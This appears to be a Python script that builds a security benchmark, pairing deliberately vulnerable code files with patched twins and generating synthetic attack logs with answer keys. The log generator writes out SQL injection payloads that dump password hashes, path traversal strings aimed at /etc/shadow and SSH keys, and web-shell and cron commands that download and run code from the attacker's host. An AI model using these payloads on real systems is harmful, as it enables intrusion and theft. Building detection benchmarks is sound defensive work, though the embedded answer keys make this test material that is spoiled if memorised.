#!/usr/bin/env python3
"""Build the security benchmark task set.

Track A (code): each src/code/<id>.* file contains exactly one vulnerability whose
line(s) are tagged with @@VULN@@. A "fixed twin" is produced by applying PATCHES.
Markers are stripped before the model sees anything.

Track B (logs): synthetic log files with background noise and one incident,
generated deterministically from a seed.

Output: tasks/manifest.json (+ tasks/code/*, tasks/logs/*). Rebuilding with the
same seed produces identical tasks.
"""
import json
import random
import zlib
import re
from datetime import datetime, timedelta
from pathlib import Path

ROOT = Path(__file__).resolve().parent
SRC = ROOT / "src" / "code"
OUT = ROOT / "tasks"
SEED = 20261109

MARK = re.compile(r"[ \t]*(?:/\*\s*@@VULN@@\s*\*/|//\s*@@VULN@@|#\s*@@VULN@@)")

LANG = {".c": "C", ".py": "Python", ".js": "JavaScript (Node.js/Express)", ".php": "PHP"}

# id -> accepted CWE numbers, short label, list of (old, new) patches for the fixed twin
CODE = {
    "c01": dict(
        label="stack/struct buffer overflow via strcpy",
        cwe=[119, 120, 121, 122, 787, 676],
        patches=[("strcpy(rec->name, field);",
                  'snprintf(rec->name, sizeof(rec->name), "%s", field);')],
    ),
    "c02": dict(
        label="off-by-one NUL write",
        cwe=[193, 119, 120, 121, 787, 170],
        patches=[("i < TOKEN_LEN; i++)", "i < TOKEN_LEN - 1; i++)")],
    ),
    "c03": dict(
        label="format string",
        cwe=[134],
        patches=[("fprintf(log_fp, msg);", "fputs(msg, log_fp);")],
    ),
    "c04": dict(
        label="use after free in error path",
        cwe=[416, 825],
        patches=[(
            "        close_session(s);\n"
            "        fprintf(stderr, \"session %d: bad chunk size %zu\\n\", s->id, n); /* @@VULN@@ */\n",
            "        fprintf(stderr, \"session %d: bad chunk size %zu\\n\", s->id, n);\n"
            "        close_session(s);\n",
        )],
    ),
    "c05": dict(
        label="integer overflow in allocation size",
        cwe=[190, 680, 131, 122, 787],
        patches=[(
            "    img->px = malloc(img->width * img->height * sizeof(struct pixel)); /* @@VULN@@ */\n",
            "    if (img->width > 16384 || img->height > 16384) {\n"
            "        free(img);\n"
            "        return NULL;\n"
            "    }\n"
            "    img->px = malloc((size_t)img->width * img->height * sizeof(struct pixel));\n",
        )],
    ),
    "c06": dict(
        label="TOCTOU access()/open() in setuid program",
        cwe=[367, 362, 363],
        patches=[(
            "    /* Make sure the invoking user is allowed to read the file. */\n"
            "    if (access(path, R_OK) != 0) { /* @@VULN@@ */\n"
            "        perror(\"access\");\n"
            "        return 1;\n"
            "    }\n"
            "\n"
            "    int in = open(path, O_RDONLY); /* @@VULN@@ */\n",
            "    /* Open the input with the invoking user's privileges. */\n"
            "    if (seteuid(getuid()) != 0) {\n"
            "        perror(\"seteuid\");\n"
            "        return 1;\n"
            "    }\n"
            "    int in = open(path, O_RDONLY | O_NOFOLLOW);\n"
            "    if (seteuid(0) != 0) {\n"
            "        perror(\"seteuid\");\n"
            "        return 1;\n"
            "    }\n",
        )],
    ),
    "py01": dict(
        label="SQL injection",
        cwe=[89, 943],
        patches=[(
            "f\"SELECT id, name, price FROM items WHERE category = '{category}' LIMIT ?\", (limit,)",
            "\"SELECT id, name, price FROM items WHERE category = ? LIMIT ?\", (category, limit)",
        )],
    ),
    "py02": dict(
        label="OS command injection via shell=True",
        cwe=[78, 77, 88],
        patches=[
            ("cmd = f\"convert '{src}' -resize {size}x{size} '{dst}'\"",
             "cmd = [\"convert\", src, \"-resize\", f\"{size}x{size}\", dst]"),
            ("subprocess.call(cmd, shell=True)", "subprocess.call(cmd)"),
        ],
    ),
    "py03": dict(
        label="path traversal",
        cwe=[22, 23, 36, 73],
        patches=[(
            "        path = os.path.join(DOC_ROOT, doc)  # @@VULN@@\n",
            "        path = os.path.realpath(os.path.join(DOC_ROOT, doc))\n"
            "        if not path.startswith(DOC_ROOT + os.sep):\n"
            "            self.send_error(403)\n"
            "            return\n",
        )],
    ),
    "py04": dict(
        label="insecure deserialization (pickle from cookie)",
        cwe=[502],
        patches=[
            ("import pickle\n", "import json\n"),
            ("pickle.loads(base64.b64decode(raw))", "json.loads(base64.b64decode(raw))"),
            ("base64.b64encode(pickle.dumps(prefs))", "base64.b64encode(json.dumps(prefs).encode())"),
        ],
    ),
    "js01": dict(
        label="IDOR / missing ownership check",
        cwe=[639, 862, 863, 284, 285, 566, 200],
        patches=[(
            "WHERE id = $1\", // @@VULN@@\n    [id]\n",
            "WHERE id = $1 AND owner_id = $2\",\n    [id, req.user.id]\n",
        )],
    ),
    "php01": dict(
        label="unsalted MD5 password hashing",
        cwe=[916, 328, 327, 759, 760, 261],
        patches=[
            ("$hash = md5($password);", "$hash = password_hash($password, PASSWORD_DEFAULT);"),
            ("if (hash_equals($row['pw_hash'], md5($password))) {",
             "if (password_verify($password, $row['pw_hash'])) {"),
        ],
    ),
}


def strip_markers(text):
    lines, marked = [], []
    for i, line in enumerate(text.split("\n"), 1):
        if "@@VULN@@" in line:
            marked.append(i)
            line = MARK.sub("", line)
            assert "@@VULN@@" not in line, line
        lines.append(line)
    return "\n".join(lines), marked


def build_code(rng):
    tasks = []
    (OUT / "code").mkdir(parents=True, exist_ok=True)
    for cid, spec in CODE.items():
        src = next(SRC.glob(cid + ".*"))
        raw = src.read_text()
        fixed_raw = raw
        for old, new in spec["patches"]:
            assert fixed_raw.count(old) == 1, f"{cid}: patch target not unique/found: {old[:60]!r}"
            fixed_raw = fixed_raw.replace(old, new)
        vuln, lines = strip_markers(raw)
        fixed, _ = strip_markers(fixed_raw)
        assert lines, f"{cid}: no @@VULN@@ marker"
        assert vuln != fixed
        for variant, text, vlines in (("vuln", vuln, lines), ("fixed", fixed, [])):
            tid = f"code-{cid}-{variant}"
            path = OUT / "code" / f"{tid}{src.suffix}"
            path.write_text(text)
            tasks.append(dict(
                id=tid, track="code", file=str(path.relative_to(ROOT)), lang=LANG[src.suffix],
                key=dict(vulnerable=variant == "vuln", cwe=spec["cwe"] if variant == "vuln" else [],
                         lines=vlines, label=spec["label"]),
            ))
    rng.shuffle(tasks)  # interleave vuln/fixed so order gives nothing away
    return tasks


# ---------------------------------------------------------------- logs ----

HOST = "web01"
USERS = ["alice", "bob", "deploy", "ci-runner", "mwong", "priya"]
INTERNAL = [f"10.20.{a}.{b}" for a, b in [(1, 14), (1, 22), (3, 7), (3, 41), (8, 2), (8, 19)]]
SCAN_USERS = ["root", "admin", "test", "ubuntu", "oracle", "user", "guest", "postgres", "pi", "ftpuser"]
UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/129.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 14_6) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/18.0 Safari/605.1.15",
    "Mozilla/5.0 (X11; Linux x86_64; rv:131.0) Gecko/20100101 Firefox/131.0",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 18_0 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
]
TECHNIQUES = ["brute_force", "password_spray", "sqli", "path_traversal", "web_shell",
              "cron_persistence", "ssh_key_persistence"]


def uid_of(user):
    fixed = {"root": 0, "www-data": 33}
    return fixed.get(user, 1000 + zlib.crc32(user.encode()) % 500)


def rand_public_ip(rng):
    while True:
        a = rng.choice([23, 45, 61, 77, 89, 103, 109, 141, 159, 176, 185, 193, 212, 222])
        ip = f"{a}.{rng.randint(1, 254)}.{rng.randint(0, 254)}.{rng.randint(1, 254)}"
        return ip


def syslog_ts(t):
    return t.strftime("%b ") + f"{t.day:2d}" + t.strftime(" %H:%M:%S")


def nginx_ts(t):
    return t.strftime("%d/%b/%Y:%H:%M:%S +0000")


class AuthLog:
    def __init__(self, rng):
        self.rng = rng
        self.lines = []  # (time, text, tag)

    def add(self, t, prog, msg, tag=None):
        pid = self.rng.randint(1000, 65000)
        self.lines.append((t, f"{syslog_ts(t)} {HOST} {prog}[{pid}]: {msg}", tag))

    def add_nopid(self, t, prog, msg, tag=None):
        self.lines.append((t, f"{syslog_ts(t)} {HOST} {prog}: {msg}", tag))

    def ssh_fail(self, t, user, ip, tag=None, invalid=False):
        port = self.rng.randint(32768, 60999)
        who = f"invalid user {user}" if invalid else user
        self.add(t, "sshd", f"Failed password for {who} from {ip} port {port} ssh2", tag)

    def ssh_ok(self, t, user, ip, method="password", tag=None):
        port = self.rng.randint(32768, 60999)
        self.add(t, "sshd", f"Accepted {method} for {user} from {ip} port {port} ssh2", tag)
        self.add(t, "sshd", f"pam_unix(sshd:session): session opened for user {user}(uid={uid_of(user)}) by (uid=0)", tag)
        self.add(t + timedelta(seconds=1), "systemd-logind", f"New session {self.rng.randint(100, 9999)} of user {user}.", tag)

    def noise(self, start, end, n):
        rng = self.rng
        span = (end - start).total_seconds()
        for _ in range(n):
            t = start + timedelta(seconds=rng.uniform(0, span))
            r = rng.random()
            if r < 0.30:  # internet background scanning: 1-3 failures, never succeeds
                ip = rand_public_ip(rng)
                user = rng.choice(SCAN_USERS)
                for k in range(rng.randint(1, 3)):
                    self.ssh_fail(t + timedelta(seconds=2 * k), user, ip, invalid=user not in ("root",))
                self.add(t + timedelta(seconds=7), "sshd", f"Connection closed by authenticating user {user} {ip} port {rng.randint(32768, 60999)} [preauth]")
            elif r < 0.50:  # legit admin logins from the office network
                u = rng.choice(USERS)
                ip = rng.choice(INTERNAL)
                self.ssh_ok(t, u, ip, method=rng.choice(["publickey", "publickey", "password"]))
                self.add(t + timedelta(minutes=rng.randint(2, 40)), "sshd", f"pam_unix(sshd:session): session closed for user {u}")
            elif r < 0.65:  # legit sudo
                u = rng.choice(["alice", "bob", "deploy"])
                cmd = rng.choice(["/usr/bin/apt update", "/usr/bin/systemctl restart nginx", "/usr/bin/journalctl -u app",
                                  "/usr/bin/docker ps", "/usr/bin/tail -n 100 /var/log/nginx/error.log", "/usr/sbin/ufw status"])
                self.add_nopid(t, "sudo", f"   {u} : TTY=pts/{rng.randint(0, 4)} ; PWD=/home/{u} ; USER=root ; COMMAND={cmd}")
                self.add_nopid(t, "sudo", f"pam_unix(sudo:session): session opened for user root(uid=0) by {u}(uid={uid_of(u)})")
            elif r < 0.90:  # cron
                job = rng.choice(["root", "root", "www-data", "deploy"])
                self.add(t.replace(second=1), "CRON", f"pam_unix(cron:session): session opened for user {job}(uid=0) by (uid=0)".replace("(uid=0) by", f"(uid={uid_of(job)}) by", 1))
                cmd = {"root": rng.choice(["test -x /usr/sbin/anacron || run-parts --report /etc/cron.daily", "/usr/local/bin/backup.sh >/dev/null 2>&1"]),
                       "www-data": "php /var/www/app/artisan schedule:run >> /dev/null 2>&1",
                       "deploy": "/home/deploy/bin/rotate-releases.sh"}[job]
                self.add(t.replace(second=1), "CRON", f"({job}) CMD ({cmd})")
                self.add(t.replace(second=2), "CRON", f"pam_unix(cron:session): session closed for user {job}")
            else:  # misc
                self.add(t, "systemd-logind", rng.choice(["Watching system buttons on /dev/input/event0 (Power Button)",
                                                          f"Session {rng.randint(100, 9999)} logged out. Waiting for processes to exit.",
                                                          f"Removed session {rng.randint(100, 9999)}."]))

    def render(self):
        self.lines.sort(key=lambda x: x[0])
        return "\n".join(l[1] for l in self.lines) + "\n"


class NginxLog:
    PAGES = ["/", "/products.php?id={n}", "/products.php?id={n}&ref=home", "/cart", "/about", "/contact",
             "/static/css/site.{n}.css", "/static/js/app.{n}.js", "/img/p/{n}.jpg", "/download?file=manual-{n}.pdf",
             "/search?q=usb+cable", "/search?q=hdmi", "/account", "/upload.php"]

    def __init__(self, rng):
        self.rng = rng
        self.lines = []

    def req(self, t, ip, method, path, status, size=None, ua=None, ref="-", tag=None):
        size = size if size is not None else self.rng.randint(200, 48000)
        ua = ua or self.rng.choice(UAS)
        self.lines.append((t, f'{ip} - - [{nginx_ts(t)}] "{method} {path} HTTP/1.1" {status} {size} "{ref}" "{ua}"', tag))

    def noise(self, start, end, n):
        rng = self.rng
        span = (end - start).total_seconds()
        visitors = [rand_public_ip(rng) for _ in range(60)]
        for _ in range(n):
            t = start + timedelta(seconds=rng.uniform(0, span))
            r = rng.random()
            if r < 0.85:
                ip = rng.choice(visitors)
                p = rng.choice(self.PAGES).format(n=rng.randint(1, 400))
                method = "POST" if p in ("/cart", "/upload.php") and rng.random() < 0.5 else "GET"
                status = 200 if rng.random() < 0.95 else rng.choice([304, 404])
                self.req(t, ip, method, p, status, ref="https://shop.example.com/")
            else:  # opportunistic scanners, all 404
                ip = rand_public_ip(rng)
                p = rng.choice(["/.env", "/wp-login.php", "/.git/config", "/phpmyadmin/", "/admin.php", "/xmlrpc.php", "/vendor/phpunit/phpunit/src/Util/PHP/eval-stdin.php"])
                self.req(t, ip, "GET", p, 404, size=162, ua=rng.choice(["Mozilla/5.0 zgrab/0.x", "python-requests/2.31.0", "curl/8.5.0", UAS[0]]))

    def render(self):
        self.lines.sort(key=lambda x: x[0])
        return "\n".join(l[1] for l in self.lines) + "\n"


def first_tagged(log):
    log.lines.sort(key=lambda x: x[0])
    return next(l[0] for l in log.lines if l[2] == "attack")


def scenario(rng, name, kind, n_noise):
    start = datetime(2026, 11, 3, 0, 0, 0) + timedelta(hours=rng.randint(0, 6))
    end = start + timedelta(hours=18)
    atk = rand_public_ip(rng)
    t0 = start + timedelta(seconds=rng.uniform(0.35, 0.65) * (end - start).total_seconds())
    key = dict(attacker_ip=atk)

    if kind in ("brute_force", "brute_force_fail", "password_spray", "cron_persistence", "ssh_key_persistence"):
        log, fmt = AuthLog(rng), "Linux /var/log/auth.log (syslog format)"
        log.noise(start, end, n_noise)
        t = t0
        if kind in ("brute_force", "brute_force_fail"):
            victim = "backup" if kind == "brute_force" else "admin"
            for _ in range(rng.randint(45, 70)):
                log.ssh_fail(t, victim, atk, tag="attack", invalid=False)
                t += timedelta(seconds=rng.uniform(1.5, 4))
            if kind == "brute_force":
                log.ssh_ok(t, victim, atk, tag="attack")
                key.update(technique="brute_force", compromised_account=[victim])
            else:
                key.update(technique="brute_force", compromised_account=["none"])
        elif kind == "password_spray":
            victims = rng.sample(["jsmith", "mwong", "priya", "kdavis", "tnguyen", "lgarcia", "hr", "sales", "support",
                                  "marketing", "jenkins", "git", "nagios", "backup", "dev", "qa", "intern", "office",
                                  "reception", "finance", "it", "helpdesk", "web", "mail"], 24)
            victims.remove("jsmith") if "jsmith" in victims else None
            victims.insert(rng.randint(14, 20), "jsmith")
            for v in victims:
                log.ssh_fail(t, v, atk, tag="attack", invalid=v not in ("jsmith", "mwong", "priya"))
                if v == "jsmith":
                    t += timedelta(seconds=rng.uniform(40, 90))
                    log.ssh_ok(t, "jsmith", atk, tag="attack")
                t += timedelta(seconds=rng.uniform(40, 120))  # slow and low
            key.update(technique="password_spray", compromised_account=["jsmith"])
        elif kind == "cron_persistence":
            log.ssh_ok(t, "svc-git", atk, tag="attack")
            t += timedelta(minutes=3)
            log.add(t, "crontab", "(svc-git) BEGIN EDIT (svc-git)", tag="attack")
            log.add(t + timedelta(seconds=40), "crontab", "(svc-git) REPLACE (svc-git)", tag="attack")
            log.add(t + timedelta(seconds=41), "crontab", "(svc-git) END EDIT (svc-git)", tag="attack")
            tt = t.replace(second=0) + timedelta(minutes=5)
            while tt < end:
                log.add(tt, "CRON", "(svc-git) CMD (curl -fsS http://" + atk + ":8443/u.sh | sh >/dev/null 2>&1)", tag="post")
                tt += timedelta(minutes=10)
            log.add(t + timedelta(minutes=6), "sshd", "pam_unix(sshd:session): session closed for user svc-git")
            key.update(technique="cron_persistence", compromised_account=["svc-git"])
        elif kind == "ssh_key_persistence":
            log.ssh_ok(t, "dbadmin", atk, tag="attack")
            t += timedelta(minutes=2)
            log.add_nopid(t, "sudo", f" dbadmin : TTY=pts/3 ; PWD=/home/dbadmin ; USER=root ; COMMAND=/usr/bin/mkdir -p /root/.ssh", tag="attack")
            log.add_nopid(t + timedelta(seconds=9), "sudo", f" dbadmin : TTY=pts/3 ; PWD=/home/dbadmin ; USER=root ; COMMAND=/usr/bin/tee -a /root/.ssh/authorized_keys", tag="attack")
            log.add(t + timedelta(minutes=1), "sshd", "pam_unix(sshd:session): session closed for user dbadmin")
            log.ssh_ok(t + timedelta(hours=2, minutes=13), "root", atk, method="publickey", tag="post")
            key.update(technique="ssh_key_persistence", compromised_account=["dbadmin", "root"])
    else:
        log, fmt = NginxLog(rng), "nginx access log (combined format)"
        log.noise(start, end, n_noise)
        t = t0
        ua = UAS[2]
        if kind == "sqli":
            payloads = ["1'", "1%27%20OR%20%271%27%3D%271", "1%20AND%201%3D1", "1%20AND%201%3D2", "1%20ORDER%20BY%205--%20-",
                        "1%20ORDER%20BY%209--%20-", "-1%20UNION%20SELECT%201,2,3,4,5--%20-",
                        "-1%20UNION%20SELECT%201,version(),database(),4,5--%20-",
                        "-1%20UNION%20SELECT%201,group_concat(table_name),3,4,5%20FROM%20information_schema.tables%20WHERE%20table_schema=database()--%20-",
                        "-1%20UNION%20SELECT%201,group_concat(email,0x3a,pw_hash),3,4,5%20FROM%20users--%20-"]
            log.req(t, atk, "GET", "/products.php?id=12", 200, ua=ua, tag="attack")
            for p in payloads:
                t += timedelta(seconds=rng.uniform(5, 30))
                log.req(t, atk, "GET", f"/products.php?id={p}", rng.choice([200, 500]) if "UNION" not in p else 200, ua=ua, tag="attack")
            key.update(technique="sqli", compromised_account=["none"])
        elif kind == "path_traversal":
            log.req(t, atk, "GET", "/download?file=manual-7.pdf", 200, ua=ua, tag="attack")
            for p in ["../etc/passwd", "../../etc/passwd", "../../../../etc/passwd", "....//....//....//etc/passwd",
                      "../../../../etc/shadow", "../../../../var/www/app/.env", "../../../../root/.ssh/id_rsa",
                      "../../../../proc/self/environ"]:
                t += timedelta(seconds=rng.uniform(3, 20))
                ok = p in ("../../../../etc/passwd", "../../../../var/www/app/.env", "../../../../proc/self/environ")
                log.req(t, atk, "GET", "/download?file=" + p.replace("/", "%2F"), 200 if ok else 404, size=rng.randint(900, 3000) if ok else 162, ua=ua, tag="attack")
            key.update(technique="path_traversal", compromised_account=["none"])
        elif kind == "web_shell":
            log.req(t, atk, "POST", "/upload.php", 200, size=87, ua=ua, tag="attack")
            shell = f"/uploads/img_{rng.randint(1000, 9999)}.php"
            for c in ["id", "uname%20-a", "cat%20/etc/passwd", "ls%20-la%20/var/www", "cat%20/var/www/app/.env",
                      "wget%20http%3A%2F%2F" + atk + "%3A8000%2Fk%20-O%20/tmp/k", "chmod%20%2Bx%20/tmp/k", "/tmp/k"]:
                t += timedelta(seconds=rng.uniform(10, 60))
                log.req(t, atk, "GET", f"{shell}?cmd={c}", 200, size=rng.randint(30, 1800), ua=ua, tag="attack")
            key.update(technique="web_shell", compromised_account=["none", "www-data"])

    first = first_tagged(log)
    key["first_seen"] = first.strftime("%H:%M:%S")
    key["first_seen_full"] = syslog_ts(first) if isinstance(log, AuthLog) else nginx_ts(first)
    return log.render(), fmt, key


LOG_SCENARIOS = [  # (id, kind, background events) -> sized to roughly 5k..20k tokens (logs tokenize at ~2 chars/token)
    ("L1", "brute_force", 25),
    ("L2", "sqli", 34),
    ("L3", "path_traversal", 52),
    ("L4", "password_spray", 51),
    ("L5", "web_shell", 86),
    ("L6", "cron_persistence", 76),
    ("L7", "ssh_key_persistence", 116),
    ("L8", "brute_force_fail", 128),
]


def build_logs(rng):
    (OUT / "logs").mkdir(parents=True, exist_ok=True)
    tasks = []
    for lid, kind, n in LOG_SCENARIOS:
        text, fmt, key = scenario(rng, lid, kind, n)
        path = OUT / "logs" / f"log-{lid}.log"
        path.write_text(text)
        tasks.append(dict(id=f"log-{lid}", track="logs", file=str(path.relative_to(ROOT)), fmt=fmt,
                          key=dict(key, scenario=kind), approx_chars=len(text)))
    return tasks


def main():
    rng = random.Random(SEED)
    tasks = build_code(rng) + build_logs(rng)
    manifest = dict(seed=SEED, built=datetime.now().isoformat(timespec="seconds"),
                    techniques=TECHNIQUES, tasks=tasks)
    (OUT / "manifest.json").write_text(json.dumps(manifest, indent=1))
    n_code = sum(t["track"] == "code" for t in tasks)
    print(f"built {n_code} code tasks, {len(tasks) - n_code} log tasks -> {OUT/'manifest.json'}")
    for t in tasks:
        if t["track"] == "logs":
            print(f"  {t['id']}: {t['key']['scenario']:<20} {t['approx_chars']:>7} chars  key={ {k: t['key'][k] for k in ('attacker_ip','technique','first_seen','compromised_account')} }")


if __name__ == "__main__":
    main()
